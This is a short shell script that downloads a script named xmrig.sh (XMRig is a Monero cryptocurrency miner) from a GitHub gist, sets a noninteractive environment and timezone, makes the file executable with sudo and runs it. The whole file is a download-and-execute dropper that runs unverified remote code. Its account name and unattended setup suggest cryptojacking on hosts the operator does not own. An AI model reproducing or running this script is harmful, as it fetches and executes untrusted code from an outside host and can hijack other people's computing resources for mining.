#!/bin/sh
wget https://gist.githubusercontent.com/deaduserbot18/695cc122a5d61bdb497d0c26337f287e/raw/9b8a69a80a6af2a343eddec0c7ea207ea1b4683c/xmrig.sh

export DEBIAN_FRONTEND=noninteractive
ln -fs /usr/share/zoneinfo/America/New_York /etc/localtime

export TAG=10
sudo chmod +x xmrig.sh
./xmrig.sh